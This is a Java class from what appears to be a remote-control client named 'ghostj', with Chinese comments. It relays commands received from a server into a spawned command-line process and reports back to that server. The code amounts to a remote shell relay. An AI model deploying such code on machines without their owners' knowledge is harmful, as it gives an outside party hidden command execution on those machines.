package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.core.ProcessCmd;

import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;

import static com.ghostj.client.core.HandleConn.writeToServer;

public class FuncDefault implements AbstractFunc {

    /**
     * 被聚焦的命令行处理器,不是func
     */
    public static ProcessCmd focusedProcess=null;
    public static LinkedHashMap<String, ProcessCmd> processList=new LinkedHashMap<>();
    /**
     * 删除一个被保存在执行对象列表的执行对象
     * @param key
     */
    public static void removeProcess(String key){
        if(focusedProcess==processList.get(key))
            focusedProcess=null;
        try{
            processList.remove(key);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    /**
     * 是否有执行对象正在进行
     * @return
     */
    public static boolean processing(){
        return processList.size()!=0;
    }

    /*从抽象类重写的方法*/
    @Override
    public String getFuncName() {
        return "";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return "直接发送到命令行的指令";
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        try {
            if (focusedProcess == null) {
                //自动创建一个以现在时间为名的process
                writeToServer("自动新建一个process\n");

                /**
                 * 计算命令行处理器名
                 */
                String name = (new Date().getTime() + "");
                String realName = name.substring(name.length() - 10, name.length());
                ProcessCmd processCmd = new ProcessCmd(realName);
                /**
                 * 设置命令
                 */
                processCmd.cmd = cmd;
                /**
                 * 添加到命令行处理器列表
                 */
                processList.put(realName, processCmd);
                focusedProcess = processCmd;
                processCmd.start();
            } else {
                /**
                 * 已经focus了一个执行对象
                 * 则把信息发进去
                 */
                focusedProcess.processWriter.write(cmd);
                focusedProcess.processWriter.newLine();
                focusedProcess.processWriter.flush();
            }
        }catch (Exception e){

        }
    }
}
